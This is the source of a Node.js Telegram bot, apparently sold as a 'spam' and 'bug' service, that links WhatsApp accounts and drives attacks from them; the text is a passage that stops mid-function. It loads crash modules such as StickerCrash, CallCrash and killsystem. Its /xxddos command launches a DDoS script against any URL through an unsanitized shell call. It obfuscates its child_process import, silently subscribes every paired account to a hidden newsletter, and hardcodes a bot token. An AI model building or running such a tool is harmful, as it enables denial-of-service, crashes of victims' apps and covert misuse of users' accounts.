process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    DisconnectReason,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const pino = require('pino');
let phoneNumber = "918293007159"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache")
const { log } = require("@sabir7718/log")

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const {
    spawn
} = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveLogo = `${config.logo}`
const waSessions = {};
const pairingTracker = new Map();
const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [{
                text: '📢 Join Channel',
                url: config.channel
            }],
            [{
                text: '📱 Follow WhatsApp',
                url: config.waChannel || 'https://whatsapp.com'
            }],
            [{
                text: '✅ Check Membership',
                callback_data: 'check_membership'
            }]
        ]
    }
};

const protectionMessage = `❌ You must join, subscribe and follow our whatsapp channel, instagram, youtube channel and group to use this bot. After doing so, click "Check Membership" or use /checkmembership.`;

async function CheckSYlovesToo(botInstance, userId, chId, grId, adminId) {
    if (userId.toString() === adminId.toString()) return true;
    if (!chId && !grId) return true;
    try {
        let inChannel = true;
        let inGroup = true;
        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];

        if (chId) {
            const channelMember = await botInstance.getChatMember(chId, userId);
            inChannel = validStatuses.includes(channelMember.status);
        }

        if (grId) {
            const groupMember = await botInstance.getChatMember(grId, userId);
            inGroup = validStatuses.includes(groupMember.status);
        }

        return inChannel && inGroup;
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message);
        return true;
    }
}

const SYLoves = `./SY/S7/`

const stickerLogic = require(SYLoves + 'StickerCrash');
const CallLogic = require(SYLoves + 'CallCrash');
const IosLogic = require(SYLoves + 'IosInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const gcFrzLogic = require(SYLoves + 'gcFrz');
const crashjamLogic = require(SYLoves + 'crashjam');
const killsystemLogic = require(SYLoves + 'killsystem');
const testlogic = require(SYLoves + 'test');

const notauthorized = '🚫 You are not authorized to use this command.';

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return {
        tokens: [],
        premium: [],
        resellers: []
    };

    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);

        if (Array.isArray(parsed)) {
            return {
                tokens: parsed,
                premium: [],
                resellers: []
            };
        }

        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: parsed.premium || [],
            resellers: parsed.resellers || []
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return {
            tokens: [],
            premium: [],
            resellers: []
        };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `🚫 <b>You are not authorized to use this command.</b>\n\n` +
        `📩 Please contact the developer to buy: ${config.S7}\n\n` +
        `💰 <b>Price/Dam:</b>\n` +
        `✅ <b>Permanent Access</b>: 15$ | ₹1,500\n` +
        `✅ <b>Permanent Resell</b>: 30$ | ₹3,000\n` +
        `✅ <b>Script (No Encryption, 100%)</b>: 100$ | ₹10,000`, {
            parse_mode: 'HTML'
        }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

const Lovesbutton = {
    reply_markup: {
        inline_keyboard: [
            [{
                text: 'I| Bug Menu',
                callback_data: 'bug_menu'
            }, {
                text: 'I| Misc Menu',
                callback_data: 'misc_menu'
            }],
            [{
                text: 'I| Channel ↗',
                url: `${config.channel}`
            }]
        ]
    }
};

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '9926858900719341'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {}
}

async function StartLovingSY(chatId, number, S7, isreconnect = false, ownerId = null) {
    let authPath;
    if (ownerId) {
        authPath = `./Love/${ownerId}/Auths/${number}`;
    } else {
        authPath = `./Love/auth/${chatId}/${number}`;
    }

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, {
            recursive: true
        });
    }

    const msgRetryCounterCache = new NodeCache();
    let {
        version
    } = await fetchLatestBaileysVersion();
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        version,
        logger: pino({
            level: 'silent'
        }),
        printQRInTerminal: !pairingCode,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({
                level: "fatal"
            }).child({
                level: "fatal"
            })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: false,
        getMessage: async (key) => {
            let jid = jidNormalizedUser(key.remoteJid);
            let msg = await store.loadMessage(jid, key.id);
            return msg?.message || "";
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    });

    if (!SYxS7.authState.creds.registered) {
        if (pairingTracker.has(number)) return;
        pairingTracker.set(number, true);

        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `SEXYXEON`);
            await S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀ𝗶𝗻𝗴 ᴄᴏ𝗱𝗲 : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, {
                parse_mode: 'HTML'
            });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
            pairingTracker.delete(number);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const {
            connection,
            lastDisconnect
        } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }
        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            pairingTracker.delete(number);
            try {
                await SYLoveMeOk(SYxS7);
            } catch (e) {}
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({
                sock: SYxS7,
                num: number
            });
            if (isreconnect === false) {
                await delay(1000);
                await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }

        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);

            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost || reason === DisconnectReason.timedOut || reason === 515) {
                log('info', 'WhatsApp', `Auto-Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7, false);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, {
                    parse_mode: 'HTML'
                }).catch(() => {});

                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, {
                    recursive: true,
                    force: true
                });
            } else {
                pairingTracker.delete(number);
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, {
                    parse_mode: 'HTML'
                }).catch(() => {});
            }
        }
    });
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true);
                    await delay(3000);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`, {
                    parse_mode: 'HTML'
                }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) {
        return 'Owner';
    }
    if (db.resellers.includes(love.toString())) {
        return 'Reseller';
    }
    if (db.premium.includes(love.toString())) {
        return 'Premium';
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love, SABIR7718, SABANA) {
    const status = GetSYLoVe(love);
    return `┌──────┤ ${SABIR7718} ├──────┐\n│➻ Name: ${name}\n│➻ Developer: ${SABANA}\n│➻ Status: ${status}\n│➻ Online: ${uptime}\n└──────────────────────┘`;
}

function BvgSYLoVe(cleanTarget) {
    return `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ \n┃ Tᴀʀɢᴇ𝒕 : ${cleanTarget}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
}

function startSYloveBot(token) {
    try {
        const S7 = new SY(token, {
            polling: true
        });
        let db = getDB();
        let tokenData = db.tokens.find(t => t.token === token);
        let SABIR7718;

        let botConfig = {
            channel: config.channel,
            group: config.group,
            logo: config.logo,
            botName: "Ϟ 𝙕⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ", // Nome atualizado aqui
            ownerContact: config.S7,
            protection: false,
            channelId: config.channelId,
            groupId: config.groupId
        };

        if (tokenData && tokenData.config) {
            if (tokenData.config.channel) botConfig.channel = tokenData.config.channel;
            if (tokenData.config.group) botConfig.group = tokenData.config.group;
            if (tokenData.config.logo) botConfig.logo = tokenData.config.logo;
            if (tokenData.config.botName) botConfig.botName = tokenData.config.botName;
            if (tokenData.config.ownerContact) botConfig.ownerContact = tokenData.config.ownerContact;
            if (tokenData.config.protectionState !== undefined) botConfig.protection = tokenData.config.protectionState;
            if (tokenData.config.channelId) botConfig.channelId = tokenData.config.channelId;
            if (tokenData.config.groupId) botConfig.groupId = tokenData.config.groupId;
        }

        const botOwnerId = tokenData ? tokenData.owner : config.adminId;
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === "8590832673:AAF9YcCnbb2OcPZ11iCZ3bQ_scN-2O0q324") { // Validação com o teu token principal
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

            if (
                err.message.includes('404') ||
                err.message.includes('401') ||
                err.message.includes('Unauthorized')
            ) {
                await S7Naverdead(token, err.message);
            }
        });
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function VOIDSEC() {
            return {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '📢 Join Channel',
                            url: botConfig.channel
                        }],
                        [{
                            text: '👥 Join Group',
                            url: botConfig.group
                        }],
                        [{
                            text: '📱 Follow WhatsApp',
                            url: config.waChannel || 'https://whatsapp.com'
                        }],
                        [{
                            text: '✅ Check Membership',
                            callback_data: 'check_membership'
                        }]
                    ]
                }
            };
        }

        SABIR7718 = {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: 'I| Bug Menu',
                        callback_data: 'bug_menu'
                    }, {
                        text: 'I| Misc Menu',
                        callback_data: 'misc_menu'
                    }],
                    [{
                        text: 'I| Channel ↗',
                        url: `${botConfig.channel}`
                    }]
                ]
            }
        };

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];

            S7.on('message', async (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);

                if (commands.includes(cmd)) {
                    const chatId = msg.chat.id;
                    const userId = msg.from.id;

                    if (botConfig.protection && cmd !== 'checkmembership') {
                        const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

                        if (!isMember) {
                            const protectMsg = `❌ <b>Access Denied!</b>\n\nYou must join our Channel & Group to use this bot.\n\n👤 <b>Owner:</b> ${botConfig.ownerContact}\nClick "Check Membership" after joining.`;

                            return S7.sendMessage(chatId, protectMsg, {
                                parse_mode: 'HTML',
                                ...VOIDSEC()
                            });
                        }
                    }

                    try {
                        const name = msg.from.first_name || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                    }
                }
            });
        }

        SYLoVe(['start', 'menu'], (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();
            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) {
                users = JSON.parse(fs.readFileSync(userFile));
            }
            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({
                    id: chatId,
                    name: name,
                    date: new Date().toLocaleString()
                });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }

            const love = msg.from.id.toString();
            const captionText = `┌──────┤ Ϟ 𝙕⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ ├──────┐\n│➻ Name: ${name}\n│➻ Developer: ${botConfig.ownerContact}\n│➻ Status: ${GetSYLoVe(love)}\n│➻ Online: ${uptime}\n└──────────────────────┘\n┌──────┤ Press Button Menu ├──────┐\n└────────────────────────┘`;

            S7.sendPhoto(chatId, botConfig.logo, {
                caption: captionText,
                ...SABIR7718
            }).catch(() => {
                S7.sendMessage(chatId, captionText, SABIR7718);
            });
        });

        SYLoVe('setbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            if (tokenData && tokenData.owner !== chatId) {
                return S7.sendMessage(chatId, '❌ You are not the owner of this bot.');
            }

            const messageText = msg.text || msg.caption || '';
            const args = messageText.split(' ');
            const type = args[1]?.toLowerCase();
            let value = args.slice(2).join(' ');

            if (type === 'logo' && msg.photo) {
                value = msg.photo[msg.photo.length - 1].file_id;
            } else if (type === 'logo' && msg.reply_to_message && msg.reply_to_message.photo) {
                value = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
            }

            if (!type || !value) {
                return S7.sendMessage(chatId,
                    '⚙️ *Bot Customization*\n\n' +
                    '*Branding:*\n' +
                    '/setbot name <Name>\n' +
                    '/setbot logo <Upload a Link or Photo With a Caption>\n' +
                    '/setbot channel <Link>\n' +
                    '/setbot group <Link>\n' +
                    '/setbot contact <@User>\n\n' +
                    '*Protection (Force Sub):*\n' +
                    '/setbot protection on/off\n' +
                    '/setbot channelid <ID> (e.g -100xxxx)\n' +
                    '/setbot groupid <ID> (e.g -100xxxx)', {
                        parse_mode: 'Markdown'
                    }
                );
            }

            db = getDB();
            let tIndex = db.tokens.findIndex(t => t.token === token);

            if (tIndex === -1) {
                return S7.sendMessage(chatId,
                    '❌ <b>Error:</b> This bot is not found in the database.\n' +
                    'If this is the Main Bot, please edit <code>config.js</code> manually instead of using this command.', {
                        parse_mode: 'HTML'
                    }
                );
            }

            if (!db.tokens[tIndex].config) db.tokens[tIndex].config = {};

            if (type === 'channel') db.tokens[tIndex].config.channel = value;
            else if (type === 'group') db.tokens[tIndex].config.group = value;
            else if (type === 'logo') db.tokens[tIndex].config.logo = value;
            else if (type === 'name') db.tokens[tIndex].config.botName = value;
            else if (type === 'contact') db.tokens[tIndex].config.ownerContact = value;
            else if (type === 'protection') {
                db.tokens[tIndex].config.protectionState = (value.toLowerCase() === 'on');
            } else if (type === 'channelid') db.tokens[tIndex].config.channelId = value;
            else if (type === 'groupid') db.tokens[tIndex].config.groupId = value;
            else return S7.sendMessage(chatId, '❌ Invalid type. Check the menu for options.');

            saveDB(db);

            await S7.sendMessage(chatId, `✅ <b>${type}</b> updated! Restarting bot to apply changes...`, {
                parse_mode: 'HTML'
            });

            if (activeBots[token]) {
                try {
                    await activeBots[token].stopPolling();
                } catch (e) {
                    console.log('Error stopping polling during restart:', e.message);
                }
            }
            startSYloveBot(token);
        });

        SYLoVe('delbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            let db = getDB();

            const botData = db.tokens.find(t => t.owner === chatId);

            if (!botData) {
                return S7.sendMessage(chatId, '❌ You do not have a hosted bot.');
            }

            if (activeBots[botData.token]) {
                await activeBots[botData.token].stopPolling();
                delete activeBots[botData.token];
            }

            db.tokens = db.tokens.filter(t => t.owner !== chatId);
            saveDB(db);

            const userAuthPath = `./Love/${chatId}`;
            if (fs.existsSync(userAuthPath)) {
                fs.rmSync(userAuthPath, {
                    recursive: true,
                    force: true
                });
            }

            S7.sendMessage(chatId, '✅ Your bot has been deleted and sessions removed.');
        });

        SYLoVe('addbot', async (msg) => {
            const chatId = msg.chat.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];

            if (!newToken) return S7.sendMessage(chatId, '❌ Usage: /addbot <TOKEN>');

            let db = getDB();
            const userBots = db.tokens.filter(t => t.owner === chatId);
            if (userBots.length >= 1) {
                return S7.sendMessage(chatId, '❌ You can only host 1 bot.');
            }

            try {
                const tempBot = new SY(newToken, {
                    polling: false
                });
                const botInfo = await tempBot.getMe();
                db.tokens.push({
                    token: newToken,
                    owner: chatId,
                    config: {
                        channel: config.channel,
                        group: config.group,
                        logo: config.logo,
                        botName: botInfo.first_name
                    }
                });
                saveDB(db);
                startSYloveBot(newToken);

                S7.sendMessage(chatId,
                    `✅ <b>Bot Hosted Successfully!</b>\n\n` +
                    `🤖 Name: ${botInfo.first_name}\n` +
                    `user: @${botInfo.username}\n\n` +
                    `⚠️ <b>Next Steps:</b>\n` +
                    `1. Make your bot <b>ADMIN</b> in your Channel & Group.\n` +
                    `2. Use <code>/setbot</code> to customize your links and image.`, {
                        parse_mode: 'HTML'
                    }
                );

            } catch (e) {
                S7.sendMessage(chatId, '❌ Invalid Token or Bot already active.');
            }
        });

        SYLoVe('xxddos', (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ').slice(1);
            if (args.length < 2) {
                return S7.sendMessage(
                    chatId,
                    '❌ Usage:\n/xxddos <web> <time>\n\nExample:\n/ddos https://example.com 60'
                );
            }
            const target = args[0];
            const time = args[1];
            S7.sendMessage(
                chatId,
                `⚡ <b>Attacking Target</b>\n\n` +
                `🎯 Target: <code>${target}</code>\n` +
                `⏱ Time: <code>${time}</code> seconds\n\n` +
                `⚙️ Process started...`, {
                    parse_mode: 'HTML'
                }
            );
            spawn(
                `node ./SY/ddos.js ${target} ${time}`, {
                    shell: true,
                    stdio: 'inherit'
                }
            );
        });

        SYLoVe('checkmembership', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;

            const isMember = await CheckSYlovesToo(S7, userId, botConfig.channelId, botConfig.groupId, botOwnerId);

            if (isMember) {
                S7.sendMessage(chatId, `✅ <b>Membership verified!</b>\nYou are now a member of both the channel and group. Try your command again (e.g., /start or /reqpair).`, {
                    parse_mode: 'HTML'
                });
            } else {
                S7.sendMessage(chatId, protectionMessage, {
                    parse_mode: 'HTML',
                    ...SYLovesButton
                });
            }
        });

        SYLoVe('addtoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const newToken = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (!newToken) return S7.sendMessage(chatId, 'Usage: /addtoken <token>');
            let db = getDB();
            if (db.tokens.find(t => t.token === newToken)) {
                return S7.sendMessage(chatId, '❌ Token already connected.');
            }
            const myBotsCount = db.tokens.filter(t => t.owner === userId).length;
            if (myBotsCount >= 5) {
                return S7.sendMessage(
                    chatId,
                    '🚫 Bot limit reached!\n\nYou can only add <b>5 bots maximum</b>.', {
                        parse_mode: 'HTML'
                    }
                );
            }
            try {
                const tempBot = new SY(newToken, {
                    polling: false
                });
                const botInfo = await tempBot.getMe();
                db.tokens.push({
                    token: newToken,
                    owner: userId
                });
                saveDB(db);
                startSYloveBot(newToken);
                S7.sendMessage(chatId,
                    `✅ Token Connected\nBot: ${botInfo.first_name}\n@${botInfo.username}`
                );
            } catch (e) {
                S7.sendMessage(chatId, '❌ Invalid token.');
            }
        });

        SYLoVe('reqpair', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            let db = getDB();
            let currentBotTokenObj = db.tokens.find(t => activeBots[t.token] === S7);
            let ownerID = null;
            if (currentBotTokenObj) {
                ownerID = currentBotTokenObj.owner;
            }
            await StartLovingSY(chatId, cleanNumber, S7, false, ownerID);
        });

        SYLoVe('delpair', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const number = args[1];

            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!number) {
                return S7.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
            }

            const cleanNumber = number.replace(/[^0-9]/g, '');
            const SYPaTH = `./Love/auth/${chatId}/${cleanNumber}`;

            if (fs.existsSync(SYPaTH)) {
                try {
                    fs.rmSync(SYPaTH, {
                        recursive: true,
                        force: true
                    });
                    S7.sendMessage(chatId, `🗑️ Session deleted successfully for <b>${cleanNumber}</b>.`, {
                        parse_mode: 'HTML'
                    });
                } catch (err) {
                    S7.sendMessage(chatId, `❌ Failed to delete session: ${err.message}`);
                }
            } else {
                S7.sendMessage(chatId, `⚠️ No session found for <b>${cleanNumber}</b>.`, {
                    parse_mode: 'HTML'
                });
            }
        });

        SYLoVe('deltoken', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const delToken = args[1];
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!delToken) return S7.sendMessage(chatId, 'Usage: /deltoken <token>');

            let db = getDB();
            const tokenObj = db.tokens.find(t => t.token === delToken);

            if (!tokenObj || tokenObj.owner !== userId) {
                return S7.sendMessage(chatId, '❌ No connected token found.');
            }

            db.tokens = db.tokens.filter(t => t.token !== delToken);
            saveDB(db);

            if (activeBots[delToken]) {
                await activeBots[delToken].stopPolling();
                delete activeBots[delToken];
            }
            log('info', `Token deleted: ${delToken.substring(0, 10)}...`);
            S7.sendMessage(chatId, '✅ Token deleted successfully.');
        });

        SYLoVe('mytoken', async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id.toString();

            let db = getDB();
            const myTokens = db.tokens.filter(t => t.owner === userId);
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (myTokens.length === 0) {
                return S7.sendMessage(chatId, '❌ You have not added any tokens.');
            }

            let text = '<b>Your Connected Bots</b>\n';
            text += '────────────────────\n\n';

            let count = 1;

            for (const item of myTokens) {
                try {
                    const bot = new SY(item.token, {
                        polling: false
                    });
                    const info = await bot.getMe();

                    text += `<b>${count}. ${info.first_name}</b>\n`;
                    text += `👤 Username: <b>@${info.username}</b>\n`;
                    text += `🔑 Token:\n<code>${item.token}</code>\n`;
                    text += '────────────────────\n\n';

                    count++;
                } catch (err) {
                    text += `<b>${count}. ⚠️ Unknown Bot</b>\n`;
                    text += `🔑 Token:\n<code>${item.token}</code>\n`;
                    text += '────────────────────\n\n';
                    count++;
                }
            }

            S7.sendMessage(chatId, text, {
                parse_mode: 'HTML'
            });
        });

        SYLoVe('addresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addresell ID');

            let db = getDB();
            if (db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is already a Reseller.');

            db.resellers.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} added as Reseller.`);
        });

        SYLoVe('delresell', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (chatId !== config.adminId) return S7.sendMessage(chatId, notauthorized);

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /delresell ID');

            let db = getDB();
            if (!db.resellers.includes(targetId)) return S7.sendMessage(chatId, 'User is not a Reseller.');

            db.resellers = db.resellers.filter(id => id !== targetId);
            saveDB(db);
            S7.sendMessage(chatId, `✅ ID ${targetId} removed from Resellers.`);
        });

        SYLoVe('listresell', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            if (chatId !== config.adminId) {
                return S7.sendMessage(chatId, notauthorized);
            }

            let db = getDB();
            if (db.resellers.length === 0) {
                return S7.sendMessage(chatId, 'No resellers found.');
            }

            let text = 'Reseller List:\n\n';

            for (let i = 0; i < db.resellers.length; i++) {
                const id = db.resellers[i].toString();
                try {
                    const user = await S7.getChat(id);
                    const username = user.username ? `@${user.username} : ` : '';
                    text += `${i + 1}. ${username}<code>${id}</code>\n`;
                } catch (e) {
                    text += `${i + 1}. \`${id}\`\n`;
                }
            }
            text += '\n──────────────────';

            S7.sendMessage(chatId, text, {
                parse_mode: 'HTML'
            });
        });

        SYLoVe('addprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (!isOwner && !isReseller) return S7.sendMessage(chatId, notauthorized);

            const targetId = msg.text.split(' ')[1];
            if (!targetId) return S7.sendMessage(chatId, 'Usage: /addprem ID');

            if (db.premium.includes(targetId)) return S7.sendMessage(chatId, 'User is already Premium.');

            db.premium.push(targetId);
            saveDB(db);
            S7.sendMessage(chatId, `⭐ ID ${targetId} added to Premium.`);
        });

        SYLoVe('delprem', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            let db = getDB();
            const isOwner = chatId === config.adminId;
            const isReseller = db.resellers.includes(chatId);
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

